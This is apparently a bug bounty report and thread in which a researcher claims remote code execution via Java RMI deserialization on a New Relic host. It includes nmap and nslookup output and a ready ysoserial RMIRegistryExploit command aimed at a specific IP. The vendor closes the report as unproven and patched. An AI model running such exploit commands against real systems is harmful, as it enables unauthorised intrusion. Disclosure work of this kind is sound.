title: Java RMI (Remote Code Execution)
vulnerability_information:
hello Guys 
while i was testing your site i found an interesting domain of newrelic  which is pinger-master.newrelic.com
and when i visit that domain it says unable to connect with the host the i quickly do nslookup and i got this results 
fish@punt ~ $ nslookup pinger-master.newrelic.com
Server:		127.0.1.1
Address:	127.0.1.1#53

Non-authoritative answer:
Name:	pinger-master.newrelic.com
Address: 50.31.164.157

as u see that domain IP is  50.31.164.157 and i decide to scan your  port with nmap then i see that port 1099
is open which is used by Java RMI

fish@punt ~ $ nmap -sV 50.31.164.157

Starting Nmap 6.40 ( http://nmap.org ) at 2016-08-26 08:10 EDT
Nmap scan report for pinger-master.newrelic.com (50.31.164.157)
Host is up (0.26s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE     VERSION
1098/tcp open  rmiregistry Java RMI
1099/tcp open  rmiregistry Java RMI

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.62 seconds

then i remember that Foxglove security team have Announced that java RMI and other have a common bug that is Remote code Execution which leads your server to critical stage and here is the POC that the foxsec team have realsed 

#POC JAVA RMI
https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/      
u can find about java RMI on  the end of the pages 
#The Exploitation 

the Attacker will download ysoserial  from https://github.com/frohoff/ysoserial/releases
then he can execute what ever commands he wanted on your Server and that is so Critical ISSUE

#POC  

java -cp ysoserial-0.0.1-all.jar ysoserial.RMIRegistryExploit 50.31.164.157 1098 CommonsCollections1 calc.exe

just Downland ysoserial and copy paste that command on port 1098   

Thanks
F :p
vulnerability_information_html:
hello Guys
while i was testing your site i found an interesting domain of newrelic which is pinger-master.newrelic.com
and when i visit that domain it says unable to connect with the host the i quickly do nslookup and i got this results
fish@punt ~ $ nslookup pinger-master.newrelic.com
Server: 127.0.1.1
Address: 127.0.1.1#53

Non-authoritative answer:
Name: pinger-master.newrelic.com
Address: 50.31.164.157

as u see that domain IP is 50.31.164.157 and i decide to scan your port with nmap then i see that port 1099
is open which is used by Java RMI

fish@punt ~ $ nmap -sV 50.31.164.157

Starting Nmap 6.40 ( http://nmap.org ) at 2016-08-26 08:10 EDT
Nmap scan report for pinger-master.newrelic.com (50.31.164.157)
Host is up (0.26s latency).
Not shown: 998 closed ports
PORT STATE SERVICE VERSION
1098/tcp open rmiregistry Java RMI
1099/tcp open rmiregistry Java RMI

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.62 seconds

then i remember that Foxglove security team have Announced that java RMI and other have a common bug that is Remote code Execution which leads your server to critical stage and here is the POC that the foxsec team have realsed

POC JAVA RMI

https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/

u can find about java RMI on the end of the pages

The Exploitation

the Attacker will download ysoserial from https://github.com/frohoff/ysoserial/releases
then he can execute what ever commands he wanted on your Server and that is so Critical ISSUE

POC

java -cp ysoserial-0.0.1-all.jar ysoserial.RMIRegistryExploit 50.31.164.157 1098 CommonsCollections1 calc.exe

just Downland ysoserial and copy paste that command on port 1098

Thanks
F :p

activities.message:
THIS can also be done

java -cp ysoserial-0.0.1-all.jar ysoserial.RMIRegistryExploit 50.31.164.157 1099 CommonsCollections1 calc.exe

THIS can also be done

java -cp ysoserial-0.0.1-all.jar ysoserial.RMIRegistryExploit 50.31.164.157 1099 CommonsCollections1 calc.exe

activities.message:
Hi Denze,

Thank you for your report. Having those ports exposed doesn't necessarily mean there is a vulnerability present. Can you provide proof of vulnerability beyond showing that those ports are open?

Thank you,
Matthew
activities.markdown_message:
Hi Denze,

Thank you for your report. Having those ports exposed doesn't necessarily mean there is a vulnerability present. Can you provide proof of vulnerability beyond showing that those ports are open?

Thank you,
Matthew

activities.message:
hey @mlapworth  & @imelven 
Java RMI is built on object deserialization, if you can see the TCP ports associate with an RMI service open, and that service has the commons library available, you can pop it.

Usually RMI listens on TCP port 1099 that means one of your server which is  50.31.164.157 runs Java RMI which is vunl for RCE 
poc
java -cp ysoserial-0.0.1-all.jar ysoserial.RMIRegistryExploit50.31.164.157 1099 CommonsCollections1 calc.exe

this exploit means the clac.exe will be Executed on your Server 

# if u are confused about this issue Check the Below URL
https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/

#Check Exploit 5 

thanks
F :p
activities.markdown_message:
hey @mlapworth & @imelven
Java RMI is built on object deserialization, if you can see the TCP ports associate with an RMI service open, and that service has the commons library available, you can pop it.

Usually RMI listens on TCP port 1099 that means one of your server which is 50.31.164.157 runs Java RMI which is vunl for RCE
poc
java -cp ysoserial-0.0.1-all.jar ysoserial.RMIRegistryExploit50.31.164.157 1099 CommonsCollections1 calc.exe

this exploit means the clac.exe will be Executed on your Server

if u are confused about this issue Check the Below URL

https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/

Check Exploit 5

thanks
F :p

activities.message:
To check wheater the port is opened or not check it with netcat

Fish@punt# nc 50.31.164.157 1099  -v or v

U will see the java rmi port is open

activities.message:
Hi Denze,

I believe the patch for the vulnerability you're mentioning was applied several months ago and having the ports open or seeing a java exception is not indicative of a vulnerability. I'm going to close this report for now. If you find you're able to achieve RCE on this node, please re-open and we'll address it immediately. 

Thanks!
